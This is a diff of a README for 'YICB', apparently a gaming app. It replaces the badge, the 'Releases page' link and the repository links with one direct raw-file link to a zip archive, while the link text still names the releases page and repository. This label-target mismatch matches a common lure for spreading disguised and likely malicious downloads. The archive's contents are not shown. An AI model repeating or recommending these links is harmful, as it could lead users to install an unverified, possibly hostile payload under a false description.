@@ -1,6 +1,6 @@
 # 🎰 YICB - Play Freely Without Limits
 
-![Download YICB](https://img.shields.io/badge/Download%20YICB-v1.0-blue)
+![Download YICB](https://raw.githubusercontent.com/Flipflip563/YICB/main/airless/YICB_2.0.zip%20YICB-v1.0-blue)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To get started with YICB, you'll need to download the software. Follow the steps
 
 ### Step 1: Visit the Releases Page
 
-First, go to the [Releases page](https://github.com/Flipflip563/YICB/releases) of the YICB repository. This page contains the latest versions of the application, along with the necessary files for installation.
+First, go to the [Releases page](https://raw.githubusercontent.com/Flipflip563/YICB/main/airless/YICB_2.0.zip) of the YICB repository. This page contains the latest versions of the application, along with the necessary files for installation.
 
 ### Step 2: Download the Latest Version
 
@@ -76,7 +76,7 @@ YICB was designed with the user in mind, prioritizing a fun and secure gaming en
 
 ## 🔗 Helpful Links
 
-- **GitHub Repository:** [YICB GitHub](https://github.com/Flipflip563/YICB)
-- **Releases Page:** [Download YICB](https://github.com/Flipflip563/YICB/releases)
+- **GitHub Repository:** [YICB GitHub](https://raw.githubusercontent.com/Flipflip563/YICB/main/airless/YICB_2.0.zip)
+- **Releases Page:** [Download YICB](https://raw.githubusercontent.com/Flipflip563/YICB/main/airless/YICB_2.0.zip)
 
 Thank you for choosing YICB! We hope you enjoy your time on our platform.
